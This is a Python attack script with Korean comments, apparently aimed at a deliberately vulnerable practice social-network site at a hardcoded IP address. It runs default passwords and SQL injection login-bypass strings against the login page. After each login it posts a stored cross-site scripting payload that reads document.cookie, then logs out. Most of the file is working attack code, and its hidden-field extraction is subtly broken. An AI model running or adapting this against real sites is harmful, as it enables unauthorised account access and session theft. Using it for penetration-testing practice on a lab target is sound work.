import requests
import time
import re
from urllib.parse import urljoin


class LoginTester:
    def __init__(self, url, username_field='username', password_field='password'):
        self.url = url
        self.username_field = username_field
        self.password_field = password_field
        self.session = requests.Session()

    def try_login(self, username, password):
        """
        로그인 시도 후 (성공여부, 응답HTML) 반환
        """
        payload = {
            self.username_field: username,
            self.password_field: password
        }

        response = self.session.post(self.url, data=payload, allow_redirects=False)

        # 로그인 성공/실패 판단 로직
        if response.status_code == 302:
            # 보통 로그인 성공 시 리디렉션 발생
            return True, response.text
        elif "로그인 실패" in response.text or "비밀번호" in response.text:
            return False, response.text
        else:
            # 애매한 경우: 세션 페이지를 한번 검사
            dashboard = self.session.get(self.url)
            if "로그아웃" in dashboard.text or "내 정보" in dashboard.text:
                return True, dashboard.text
            return False, dashboard.text
        

    def create_post(self, post_page_path_or_url="/new_post.php",
                    content="자동작성 본문", content_field='content',
                    extra_fields=None, form_action_override=None, timeout=8):
        """
        게시물 작성:
        - post_page_path_or_url: 작성 페이지의 절대 URL 또는 base-relative path (예: '/write.php')
        - title/content: 작성할 제목/본문
        - title_field/content_field: 폼에서 사용하는 input/textarea 이름
        - extra_fields: dict 형태의 추가 폼 필드
        - form_action_override: 폼 action을 직접 지정하고 싶을 때 사용 (절대/상대 URL 가능)
        반환: (성공여부, 메시지)
        """
        extra_fields = extra_fields or {}
        base = self._get_base()
        post_page_url = post_page_path_or_url
        if not post_page_path_or_url.startswith("http://") and not post_page_path_or_url.startswith("https://"):
            post_page_url = urljoin(base, post_page_path_or_url)

        try:
            r = self.session.get(post_page_url, timeout=timeout)
        except Exception as e:
            return False, f"작성 페이지 GET 오류: {e}"
        
        html = r.text

        # 1) 폼 action 찾기 (단순한 방법)
        action = None
        if form_action_override:
            action = form_action_override
        else:
            m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, flags=re.IGNORECASE)
            if m:
                action = m.group(1)
        
        post_url = post_page_url if not action else urljoin(post_page_url, action)

        # 2) 숨겨진 input (예: CSRF 토큰) 자동 추출 - 가장 흔한 첫 번째 hidden token 사용
        hidden_inputs = dict()
        for name, val in re.findall(r'<input[^>]*type=[\'"]hidden[\'"][^>]*>', html, flags=re.IGNORECASE):
            # 보통 hidden도 섞여 있으니 그대로 추가
            hidden_inputs[name] = val

        # 3) payload 조합
        payload ={}
        payload.update(hidden_inputs)
        payload.update(extra_fields)
        payload[content_field] = content

        # 4) POST 전송 (폼이 multipart가 아니라 가정)
        try:
            post_resp = self.session.post(post_url, data=payload, allow_redirects=False, timeout=timeout)
        except Exception as e:
            return False, f"작성 POST 오류: {e}"
        
        # 5) 성공 판단: 보통 리디렉션(201/302) 혹은 작성 페이지에 작성된 내용 포함 여부로 판단
        if post_resp.status_code in (200, 201, 302):
            # 만약 200이면 본문에 제목/본문이 포함되었는지 체크
            check_body = ""
            try:
                # 리디렉션이 있ㅇ면 리다이렉트된 위치를 follow
                if post_resp.status_code == 302 and 'Location' in post_resp.headers:
                    follow_url = urljoin(post_url, post_resp.headers['Location'])
                    follow = self.session.get(follow_url, timeout=timeout)
                    check_body = follow.text
                else:
                    check_body = post_resp.text
            except Exception:
                check_body = post_resp.text

            if content in check_body or post_resp.status_code == 302:
                return True, f"게시물 작성 성공 (POST -> {post_url})"
            else:
                return False, "POST는 성공했지만 응답에서 작성 결과를 확인할 수 없음"
        else:
            return False, f"POST 실패: status_code={post_resp.status_code}"

        
    def logout(self):
        """
        간단하게 base/logout.php로 GET 요청을 보내 로그아웃 시도.
        실패하거나 확인 불가하면 세션을 재생성하여 초기화.
        """
        base = self._get_base()
        logout_url = base + "/logout.php"
        try:
            r = self.session.get(logout_url, allow_redirects=True, timeout=8)
            txt = r.text.lower()
            # 로그인 페이지나 'login' 단어가 보이면 로그아웃된 것으로 판단
            if "로그인" in txt or "login" in txt or "signed out" in txt:
                return True, f"Logged out via {logout_url}"
        except Exception as e:
            # 네트워크 오류 등 무시하고 세션 리셋
            pass

        # 마지막 수단: 세션 초기화 (쿠키 제거)
        self._reset_session()
        return True, "Session reset (cookies cleared)"
    
    def _reset_session(self):
        try:
            self.session.close()
        except Exception:
            pass
        self.session = requests.Session()

    def _get_base(self):
        """
        self.url에서 scheme+netloc만 단순 추출.
        예: 'http://example.com/path/to/login' -> 'http://example.com'
        """
        parts = self.url.split("/")
        if len(parts) >= 3:
            return parts[0] + "//" + parts[2]
        return self.url.rstrip("/")
    


# -----------------------
# PAYLOADS 목록
# -----------------------
PAYLOADS = [
    ("admin", "1234", "관리자 계정"),
    ("admin' or 1=1#","1234", "관리자 계정 SQLi"),
    ("admin", "1234' or '1'='1", "관리자 계정 SQLi"),
    ("user1", "password123", "테스트 계정"),
    ("root", "password", "루트 기본 비번")
]


# -----------------------
# 반복 로그인 시도
# -----------------------
tester = LoginTester(url="http://18.179.53.107/vulnerable-sns/www/login.php", username_field="username", password_field="password")

for i, (username, password, desc) in enumerate(PAYLOADS, 1):
    print(f"[{i}] {desc} → {username}/{password} 시도 중...")

    success, html = tester.try_login(username, password)

    if success:
        print(f"✅ 로그인 성공! ({username}/{password})\n")

        # 게시물 작성 시도: 작성 페이지 경로, 폼 필드 이름은 사이트에 맞춰 조정하세요.
        # content=게시글 본문(페이로드 작성)
        ok, info = tester.create_post(post_page_path_or_url="http://18.179.53.107/vulnerable-sns/www/new_post.php",
                                      content="<img src=x onerror=alert(document.cookie)>",
                                      content_field='content',
                                      extra_fields=None)
        print(f"✍️ 게시물 작성 결과: {ok}, {info}\n")

        # 로그아웃
        ok, info = tester.logout()
        print(f"🔁 로그아웃 처리: {info}\n")
        time.sleep(1)
    else:
        print(f"❌ 로그인 실패. ({username}/{password})\n")
        tester._reset_session()
        time.sleep(1)


